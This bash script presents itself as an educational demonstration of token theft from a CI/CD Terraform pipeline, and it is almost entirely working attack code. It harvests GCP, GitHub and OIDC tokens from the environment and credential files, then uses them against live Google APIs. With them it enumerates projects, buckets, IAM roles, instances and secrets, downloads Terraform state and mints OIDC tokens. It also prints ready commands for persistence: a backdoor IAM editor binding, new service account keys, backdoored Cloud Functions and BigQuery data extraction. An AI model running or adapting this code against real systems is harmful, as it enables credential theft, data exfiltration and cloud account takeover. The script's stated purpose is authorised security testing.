#!/usr/bin/env bash
# =============================================================================
# WARNING: TOKEN THEFT DEMONSTRATION - EDUCATIONAL PURPOSES ONLY
# =============================================================================
#
# This script demonstrates what an attacker can do after obtaining a GCP
# access token and GitHub token from a vulnerable CI/CD pipeline.
#
# In a real attack, this script would run inside the `external` data source
# during `terraform plan`, or as part of a malicious provider/module.
#
# DO NOT run this script against systems you do not own or have explicit
# written authorization to test.
# =============================================================================

set -euo pipefail

# ANSI color codes for output
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${RED}================================================================${NC}"
echo -e "${RED} TOKEN THEFT DEMONSTRATION - AUTHORIZED TESTING ONLY            ${NC}"
echo -e "${RED}================================================================${NC}"
echo ""

# =============================================================================
# PHASE 1: Token Collection
# =============================================================================

echo -e "${CYAN}[PHASE 1] Collecting tokens from environment...${NC}"
echo ""

# GCP Access Token
# The google-github-actions/auth action sets these environment variables:
GCP_TOKEN="${GOOGLE_OAUTH_ACCESS_TOKEN:-}"
if [ -z "$GCP_TOKEN" ]; then
    GCP_TOKEN="${CLOUDSDK_AUTH_ACCESS_TOKEN:-}"
fi
if [ -z "$GCP_TOKEN" ]; then
    # Try reading from gcloud config
    GCP_TOKEN=$(gcloud auth print-access-token 2>/dev/null || echo "")
fi
if [ -z "$GCP_TOKEN" ]; then
    # Try reading from Application Default Credentials
    GCP_TOKEN=$(cat "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null | python3 -c "
import json, sys
creds = json.load(sys.stdin)
print(creds.get('access_token', ''))
" 2>/dev/null || echo "")
fi

echo -e "  GCP Access Token: ${GCP_TOKEN:+${GREEN}FOUND${NC} (${#GCP_TOKEN} chars, starts with ${GCP_TOKEN:0:10}...)}${GCP_TOKEN:-${RED}NOT FOUND${NC}}"

# GitHub Token
GH_TOKEN="${GITHUB_TOKEN:-}"
ACTIONS_TOKEN="${ACTIONS_RUNTIME_TOKEN:-}"
echo -e "  GitHub Token:     ${GH_TOKEN:+${GREEN}FOUND${NC} (${#GH_TOKEN} chars)}${GH_TOKEN:-${RED}NOT FOUND${NC}}"
echo -e "  Actions Runtime:  ${ACTIONS_TOKEN:+${GREEN}FOUND${NC} (${#ACTIONS_TOKEN} chars)}${ACTIONS_TOKEN:-${RED}NOT FOUND${NC}}"

# OIDC Token Request (can be used to mint new tokens)
OIDC_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
OIDC_REQUEST_URL="${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
echo -e "  OIDC Request URL: ${OIDC_REQUEST_URL:+${GREEN}FOUND${NC}}${OIDC_REQUEST_URL:-${RED}NOT FOUND${NC}}"
echo -e "  OIDC Request Token: ${OIDC_REQUEST_TOKEN:+${GREEN}FOUND${NC}}${OIDC_REQUEST_TOKEN:-${RED}NOT FOUND${NC}}"

echo ""

# =============================================================================
# PHASE 2: Token Validation and Enumeration
# =============================================================================

echo -e "${CYAN}[PHASE 2] Validating tokens and enumerating permissions...${NC}"
echo ""

if [ -n "$GCP_TOKEN" ]; then
    echo -e "${YELLOW}--- GCP Token Information ---${NC}"

    # Get token info (who does this token belong to?)
    echo -e "  Token identity:"
    curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GCP_TOKEN}" 2>/dev/null | \
        python3 -c "
import json, sys
try:
    info = json.load(sys.stdin)
    print(f\"    Email: {info.get('email', 'N/A')}\")
    print(f\"    Scope: {info.get('scope', 'N/A')}\")
    print(f\"    Expires in: {info.get('expires_in', 'N/A')} seconds\")
    print(f\"    Audience: {info.get('aud', 'N/A')}\")
except:
    print('    Failed to parse token info')
" 2>/dev/null || echo "    Failed to query token info"

    echo ""

    # List accessible projects
    echo -e "  Accessible GCP Projects:"
    curl -s -H "Authorization: Bearer ${GCP_TOKEN}" \
        "https://cloudresourcemanager.googleapis.com/v1/projects" 2>/dev/null | \
        python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for p in data.get('projects', []):
        print(f\"    - {p['projectId']} ({p.get('name', 'unnamed')}) [{p.get('lifecycleState', 'unknown')}]\")
except:
    print('    Failed to list projects')
" 2>/dev/null || echo "    Failed to list projects"

    echo ""

    # List GCS buckets (looking for TF state buckets)
    echo -e "  GCS Buckets (looking for TF state):"
    PROJECT_ID="${GCP_PROJECT_ID:-}"
    if [ -n "$PROJECT_ID" ]; then
        curl -s -H "Authorization: Bearer ${GCP_TOKEN}" \
            "https://storage.googleapis.com/storage/v1/b?project=${PROJECT_ID}" 2>/dev/null | \
            python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for b in data.get('items', []):
        name = b['name']
        marker = ' <-- TERRAFORM STATE BUCKET' if 'tf' in name.lower() or 'state' in name.lower() or 'terraform' in name.lower() else ''
        print(f\"    - gs://{name}{marker}\")
except:
    print('    Failed to list buckets')
" 2>/dev/null || echo "    Failed to list buckets"
    fi

    echo ""

    # List IAM roles for the service account
    echo -e "  Service Account IAM Roles:"
    if [ -n "$PROJECT_ID" ]; then
        curl -s -H "Authorization: Bearer ${GCP_TOKEN}" \
            "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:getIamPolicy" \
            -H "Content-Type: application/json" \
            -d '{}' 2>/dev/null | \
            python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    sa_email = None
    for binding in data.get('bindings', []):
        for member in binding.get('members', []):
            if 'terraform' in member.lower() or 'ci' in member.lower():
                print(f\"    - {member}: {binding['role']}\")
except:
    print('    Failed to get IAM policy')
" 2>/dev/null || echo "    Failed to get IAM policy"
    fi

    echo ""
fi

# =============================================================================
# PHASE 3: Demonstrate GCP Resource Access
# =============================================================================

echo -e "${CYAN}[PHASE 3] Demonstrating GCP resource access...${NC}"
echo ""

if [ -n "$GCP_TOKEN" ] && [ -n "${PROJECT_ID:-}" ]; then

    # Download Terraform state from GCS
    echo -e "${YELLOW}--- Terraform State Access ---${NC}"
    STATE_BUCKET="${TF_STATE_BUCKET:-my-production-project-tf-state}"
    STATE_PATH="terraform/state/default.tfstate"
    echo -e "  Attempting to read state from gs://${STATE_BUCKET}/${STATE_PATH}"

    STATE_CONTENT=$(curl -s -H "Authorization: Bearer ${GCP_TOKEN}" \
        "https://storage.googleapis.com/storage/v1/b/${STATE_BUCKET}/o/$(echo ${STATE_PATH} | sed 's|/|%2F|g')?alt=media" 2>/dev/null || echo "")

    if [ -n "$STATE_CONTENT" ] && echo "$STATE_CONTENT" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null; then
        echo -e "  ${GREEN}SUCCESS: Terraform state is readable${NC}"
        echo "$STATE_CONTENT" | python3 -c "
import json, sys
state = json.load(sys.stdin)
print(f\"    State serial: {state.get('serial', 'N/A')}\")
print(f\"    Terraform version: {state.get('terraform_version', 'N/A')}\")
print(f\"    Resources managed: {len(state.get('resources', []))}\")
for r in state.get('resources', []):
    print(f\"      - {r['type']}.{r['name']}\")
    # Check for sensitive attributes
    for inst in r.get('instances', []):
        attrs = inst.get('attributes', {})
        sensitive_keys = [k for k in attrs if any(s in k.lower() for s in ['password', 'secret', 'key', 'token', 'private'])]
        if sensitive_keys:
            print(f\"        SENSITIVE ATTRIBUTES: {', '.join(sensitive_keys)}\")
" 2>/dev/null || echo "    Failed to parse state"
    else
        echo -e "  ${RED}State not accessible or bucket does not exist${NC}"
    fi

    echo ""

    # Check Compute Engine instances
    echo -e "${YELLOW}--- Compute Engine Instances ---${NC}"
    curl -s -H "Authorization: Bearer ${GCP_TOKEN}" \
        "https://compute.googleapis.com/compute/v1/projects/${PROJECT_ID}/aggregated/instances" 2>/dev/null | \
        python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    found = False
    for zone, info in data.get('items', {}).items():
        for instance in info.get('instances', []):
            found = True
            print(f\"    - {instance['name']} ({instance['status']}) in {zone.split('/')[-1]}\")
            print(f\"      Machine type: {instance['machineType'].split('/')[-1]}\")
            for iface in instance.get('networkInterfaces', []):
                for access in iface.get('accessConfigs', []):
                    if 'natIP' in access:
                        print(f\"      External IP: {access['natIP']}\")
    if not found:
        print('    No instances found')
except:
    print('    Failed to list instances')
" 2>/dev/null || echo "    Failed to list instances"

    echo ""

    # Check for accessible secrets in Secret Manager
    echo -e "${YELLOW}--- Secret Manager ---${NC}"
    curl -s -H "Authorization: Bearer ${GCP_TOKEN}" \
        "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets" 2>/dev/null | \
        python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for secret in data.get('secrets', []):
        name = secret['name'].split('/')[-1]
        print(f\"    - {name} (created: {secret.get('createTime', 'unknown')})\")
    if not data.get('secrets'):
        print('    No secrets found or no access')
except:
    print('    Failed to list secrets')
" 2>/dev/null || echo "    Failed to list secrets"

    echo ""
fi

# =============================================================================
# PHASE 4: Demonstrate GitHub Token Capabilities
# =============================================================================

echo -e "${CYAN}[PHASE 4] Demonstrating GitHub token capabilities...${NC}"
echo ""

if [ -n "$GH_TOKEN" ]; then
    echo -e "${YELLOW}--- GitHub Token Permissions ---${NC}"

    # Get token scopes
    HEADERS=$(curl -s -I -H "Authorization: Bearer ${GH_TOKEN}" \
        "https://api.github.com/repos/${GITHUB_REPOSITORY:-owner/repo}" 2>/dev/null || echo "")

    echo "$HEADERS" | grep -i "x-oauth-scopes" 2>/dev/null || echo "    Scopes: (fine-grained token, no scopes header)"

    # What can we do with this token?
    echo -e ""
    echo -e "  With this GITHUB_TOKEN, the attacker can:"
    echo -e "    - Read and write repository contents"
    echo -e "    - Create, update, and merge pull requests"
    echo -e "    - Post comments and approve PRs"
    echo -e "    - Create and modify releases"
    echo -e "    - Trigger other workflow runs"
    echo -e "    - Access repository secrets via workflow dispatch"
fi

echo ""

# =============================================================================
# PHASE 5: Demonstrate State Manipulation
# =============================================================================

echo -e "${CYAN}[PHASE 5] Demonstrating Terraform state manipulation...${NC}"
echo ""

echo -e "${YELLOW}--- State Injection Example ---${NC}"
echo -e "  The attacker can modify the Terraform state to:"
echo -e "  1. Add IAM bindings granting attacker access"
echo -e "  2. Remove resources from state (Terraform won't manage/delete them)"
echo -e "  3. Modify resource attributes (e.g., change firewall rules)"
echo -e "  4. Inject data that causes 'terraform apply' to make malicious changes"
echo ""

cat << 'STATE_EXAMPLE'
  Example state injection (adding a backdoor IAM member):

  {
    "mode": "managed",
    "type": "google_project_iam_member",
    "name": "monitoring_reader",
    "provider": "provider[\"registry.terraform.io/hashicorp/google\"]",
    "instances": [{
      "schema_version": 0,
      "attributes": {
        "id": "my-project/roles/editor/user:attacker@gmail.com",
        "project": "my-production-project",
        "role": "roles/editor",
        "member": "user:attacker@gmail.com"
      }
    }]
  }

  When 'terraform plan' runs next, it will see this resource as "already
  managed" and will NOT try to remove it, effectively persisting the
  attacker's access.
STATE_EXAMPLE

echo ""

# =============================================================================
# PHASE 6: Direct API Exploitation Examples
# =============================================================================

echo -e "${CYAN}[PHASE 6] Demonstrating direct GCP API exploitation...${NC}"
echo ""

echo -e "${YELLOW}--- What an attacker could do with the stolen GCP token ---${NC}"
echo ""
echo -e "  ${RED}1. Create a persistent service account key:${NC}"
echo '     curl -X POST \
       "https://iam.googleapis.com/v1/projects/PROJECT/serviceAccounts/SA/keys" \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json"'
echo ""
echo -e "  ${RED}2. Grant attacker's Google account editor access:${NC}"
echo '     gcloud projects add-iam-policy-binding PROJECT \
       --member="user:attacker@gmail.com" \
       --role="roles/editor" \
       --access-token-file=<(echo $TOKEN)'
echo ""
echo -e "  ${RED}3. Create a compute instance for crypto mining or C2:${NC}"
echo '     gcloud compute instances create attacker-vm \
       --zone=us-central1-a \
       --machine-type=n1-standard-4 \
       --image-family=debian-11 \
       --image-project=debian-cloud \
       --access-token-file=<(echo $TOKEN)'
echo ""
echo -e "  ${RED}4. Exfiltrate data from BigQuery:${NC}"
echo '     curl -X POST \
       "https://bigquery.googleapis.com/bigquery/v2/projects/PROJECT/queries" \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"query\": \"SELECT * FROM dataset.sensitive_table LIMIT 1000\"}"'
echo ""
echo -e "  ${RED}5. Read secrets from Secret Manager:${NC}"
echo '     curl \
       "https://secretmanager.googleapis.com/v1/projects/PROJECT/secrets/SECRET/versions/latest:access" \
       -H "Authorization: Bearer $TOKEN"'
echo ""
echo -e "  ${RED}6. Modify Cloud Functions to inject backdoors:${NC}"
echo '     gcloud functions deploy backdoor \
       --runtime=python39 \
       --trigger-http \
       --allow-unauthenticated \
       --source=./malicious-function \
       --access-token-file=<(echo $TOKEN)'
echo ""

# =============================================================================
# PHASE 7: OIDC Token Minting (Advanced)
# =============================================================================

echo -e "${CYAN}[PHASE 7] OIDC Token Minting (Advanced Persistence)...${NC}"
echo ""

if [ -n "${OIDC_REQUEST_URL:-}" ] && [ -n "${OIDC_REQUEST_TOKEN:-}" ]; then
    echo -e "  OIDC endpoint available. The attacker can mint new tokens with"
    echo -e "  custom audiences, potentially accessing different GCP projects"
    echo -e "  or services that trust the same Workload Identity Pool."
    echo ""
    echo -e "  Minting OIDC token with custom audience:"
    echo "    curl -s -H 'Authorization: bearer ${OIDC_REQUEST_TOKEN}' \\"
    echo "      '${OIDC_REQUEST_URL}&audience=https://custom-audience.example.com'"
    echo ""

    # Actually mint a token to demonstrate
    OIDC_JWT=$(curl -s \
        -H "Authorization: bearer ${OIDC_REQUEST_TOKEN}" \
        "${OIDC_REQUEST_URL}&audience=https://iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider" \
        2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "")

    if [ -n "$OIDC_JWT" ]; then
        echo -e "  ${GREEN}OIDC JWT minted successfully (${#OIDC_JWT} chars)${NC}"
        echo -e "  This JWT can be exchanged for a GCP access token via:"
        echo "    curl -X POST 'https://sts.googleapis.com/v1/token' \\"
        echo "      -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \\"
        echo "      -d 'audience=//iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider' \\"
        echo "      -d 'subject_token_type=urn:ietf:params:oauth:token-type:jwt' \\"
        echo "      -d 'requested_token_type=urn:ietf:params:oauth:token-type:access_token' \\"
        echo "      -d 'subject_token=\$OIDC_JWT'"
    fi
else
    echo -e "  OIDC endpoint not available (not running in GitHub Actions)"
fi

echo ""
echo -e "${RED}================================================================${NC}"
echo -e "${RED} END OF DEMONSTRATION                                           ${NC}"
echo -e "${RED} Remember: Only use these techniques with explicit authorization ${NC}"
echo -e "${RED}================================================================${NC}"
